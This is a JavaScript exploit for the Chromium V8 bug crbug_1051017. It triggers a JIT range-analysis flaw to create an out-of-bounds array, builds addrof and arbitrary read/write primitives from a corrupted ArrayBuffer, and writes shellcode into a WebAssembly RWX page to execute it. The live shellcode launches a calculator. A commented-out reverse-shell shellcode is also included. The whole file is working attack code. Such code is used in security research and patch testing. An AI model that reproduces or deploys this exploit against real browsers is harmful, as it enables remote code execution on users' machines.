/*

exploit for crbug_1051017

*/

// tookits
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var uint32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(f) {
    float64[0] = f;
    return bigUint64[0];
}
// 64-bit unsigned integer to Floating point
function i2f(i) {
    bigUint64[0] = i;
    return float64[0];
}

function f2half(val) {
    float64[0] = val;
    let tmp = Array.from(uint32);
    return tmp;
}

function half2f(val) {
    uint32.set(val);
    return float64[0];
}
// 64-bit unsigned integer to hex
function hex(i) {
    return "0x" + i.toString(16).padStart(16, "0");
}

let maxSize = 0x1000 * 4;

const MAX_ITERATIONS = 0x10000;

const kBufferPadding = 0x80000;

function force_gc() {
    for (var i = 0; i < 0x80000; ++i) {
        var a = new ArrayBuffer();
    }
}

class LeakArrayBuffer extends ArrayBuffer {
    constructor(size) {
        super(size);
        this.slot = 0xb33f;
    }
}

host_buffer = new LeakArrayBuffer(kBufferPadding + 0x100);
host_view = new DataView(this.host_buffer);
// this will externalize the host_buffer, which changes gc behaviour.
blob = new Blob([this.host_buffer]);

let target_buffer = new LeakArrayBuffer(0x1000);
let target_view = new DataView(target_buffer);

force_gc();

function trigger() {
    var x = -Infinity;
    var k = 0;
    for (var i = 0; i < 1; i += x) {
        if (i == -Infinity) {
            x = +Infinity;
        }

        if (++k > 10) {
            break;
        }
    }

    var value = Math.max(i, 1024);
    value = -value;
    value = Math.max(value, -1025);
    value = -value;
    value -= 1022;
    value >>= 1; // *** 3 ***
    value += 10; //

    let oob_array = Array(value);

    oob_array[0] = 1.1;
    return [oob_array, {}];
};

for (let i = 0; i < 20000; ++i) {
    trigger();
}

//   console.log(trigger()[0][11]);
let oob_array = trigger()[0];

var corrupt_buffer = new LeakArrayBuffer(0x1337);
var corrupt_view = new DataView(corrupt_buffer);

// corrupt_view.setUint32(0, 0x41, true);


if (oob_array.length > 10) {
    console.log("[+] oob array successed");
    console.log("[+] oob array length : " + hex(oob_array.length));
} else {
    throw "oob failed";
}

var ab_length_idx = 0;
var ab_backingstore_idx = 0;
var ab_slot_idx = 0;

for (let i = 0; i < maxSize; ++i) {
    // console.log(hex(f2i(oob_array[i])));
    if (f2i(oob_array[i]) == 0x1337) {
        console.log('find ab at : ' + i);
        console.log('length : ' + hex(f2i(oob_array[i]))); // length
        console.log('slot : ' + hex(f2i(oob_array[i + 5])));
        ab_length_idx = i;
        ab_backingstore_idx = i + 1;
        ab_slot_idx = i + 5;
        break;
    }
}


function addrof(obj) {
    corrupt_buffer.slot = obj;
    var ret = f2i(oob_array[ab_slot_idx]);
    corrupt_buffer.slot = 0xb33f;
    return ret;
}


oob_array[ab_length_idx] = oob_array[ab_backingstore_idx];
oob_array[ab_backingstore_idx] = i2f(addrof(target_buffer));
console.log("[*] corrupt_buffer.length        : " + hex(f2i(oob_array[ab_length_idx])));
console.log("[*] corrupt_buffer.backing_store : " + hex(f2i(oob_array[ab_backingstore_idx])));


var kLengthOffset = 0x17;
var kStoreOffset = 0x1f;
var kBitsOffset = 0x27;
var kSlotOffset = 0x3f;
var kSize = 0x100;

// for(var i = 0; i < 100; i++){
// 	if (corrupt_view.getUint32(i, true) == 0xb33f){
// 		kSlotOffset = i;
// 	}
// }

// console.log('kSlotOffset : ' + hex(kSlotOffset));


// console.log('done');
if (corrupt_view.getUint32(kSlotOffset + 4, true) == 0xb33f) {
    console.log('control target');
    let target_store_ptr = corrupt_view.getBigUint64(kStoreOffset, true);
    let corrupt_store_ptr = BigInt(corrupt_buffer.byteLength);

    function objToPtr(obj) {
        target_buffer.slot = obj;
        let ptr = corrupt_view.getBigUint64(kSlotOffset, true) - 1n;
        target_buffer.slot = 0xb33f;
        return ptr;
    }

    function ptrToObj(ptr) {
        corrupt_view.setBigUint64(kSlotOffset, ptr | 1n, true);
        let obj = target_buffer.slot;
        target_buffer.slot = 0xb33f;
        return obj;
    }

    function getUint64(ptr) {
        corrupt_view.setBigUint64(kStoreOffset, ptr, true);
        return target_view.getBigUint64(0, true);
    }

    function setUint64(ptr, value) {
        corrupt_view.setBigUint64(kStoreOffset, ptr, true);
        target_view.setBigUint64(0, value, true);
    }


    function ByteToBigIntArray(payload) {
        let sc = []
        let tmp = 0n;
        let lenInt = BigInt(Math.floor(payload.length / 8))
        for (let i = 0n; i < lenInt; i += 1n) {
            tmp = 0n;
            for (let j = 0n; j < 8n; j++) {
                tmp += BigInt(payload[i * 8n + j]) * (0x1n << (8n * j));
            }
            sc.push(tmp);
        }

        let len = payload.length % 8;
        tmp = 0n;
        for (let i = 0n; i < len; i++) {
            tmp += BigInt(payload[lenInt * 8n + i]) * (0x1n << (8n * i));
        }
        sc.push(tmp);
        return sc;
    }


    let corrupt_ptr = objToPtr(corrupt_buffer);
    let target_ptr = objToPtr(target_buffer);

    console.log('  [*] target_ptr:        0x' + target_ptr.toString(16));
    console.log('  [*] target_store_ptr:  0x' + target_store_ptr.toString(16));
    console.log('  [*] corrupt_ptr:       0x' + corrupt_ptr.toString(16)); // it's ok
    console.log('  [*] corrupt_store_ptr: 0x' + corrupt_store_ptr.toString(16));

    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1,
        127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0,
        1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2,
        0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 10, 11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var func = wasmInstance.exports.main;

    let wasm_func_addr = objToPtr(func);
    console.log("[+] wasm func addr : " + hex(wasm_func_addr));
    let shared_info_addr = getUint64(wasm_func_addr + 0x18n);
    console.log("[+] shared info : " + hex(shared_info_addr));
    let wasm_export_func_addr = getUint64(shared_info_addr + 0x8n - 1n);
    console.log("[+] wasm_export_func_addr : " + hex(wasm_export_func_addr));
    let instance_addr = getUint64(wasm_export_func_addr + 0x10n - 1n);
    console.log("[+] instance_addr : " + hex(instance_addr));
    let rwx_addr = getUint64(instance_addr + 0x88n - 1n);
    console.log("[+] rwx_addr : " + hex(rwx_addr));

    // reverse shell, but I forget the IP && Port :(
    // var shellcode = [0x48,0x31,0xff,0x6a,0x09,0x58,0x99,0xb6,0x10,0x48,0x89,0xd6,0x4d,0x31,0xc9,0x6a,0x22,0x41,0x5a,0xb2,0x07,0x0f,0x05,0x48,0x85,0xc0,0x78,0x51,0x6a,0x0a,0x41,0x59,0x50,0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x85,0xc0,0x78,0x3b,0x48,0x97,0x48,0xb9,0x02,0x00,0x11,0x5c,0x08,0xd2,0xa5,0x02,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x59,0x48,0x85,0xc0,0x79,0x25,0x49,0xff,0xc9,0x74,0x18,0x57,0x6a,0x23,0x58,0x6a,0x00,0x6a,0x05,0x48,0x89,0xe7,0x48,0x31,0xf6,0x0f,0x05,0x59,0x59,0x5f,0x48,0x85,0xc0,0x79,0xc7,0x6a,0x3c,0x58,0x6a,0x01,0x5f,0x0f,0x05,0x5e,0x6a,0x26,0x5a,0x0f,0x05,0x48,0x85,0xc0,0x78,0xed,0xff,0xe6];

    // pop calc, linux x64
    var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
        96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
        105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
        72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
        72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
        184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
        94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

    // write_sc(rwx_addr, shellcode);
    var sc = ByteToBigIntArray(shellcode);
    for (var i = 0; i < sc.length; i++) {
        console.log('write : ' + i);
        setUint64(rwx_addr + BigInt(i * 8), sc[i]);
    }
    console.log('write done, ready to rce');

    func();
}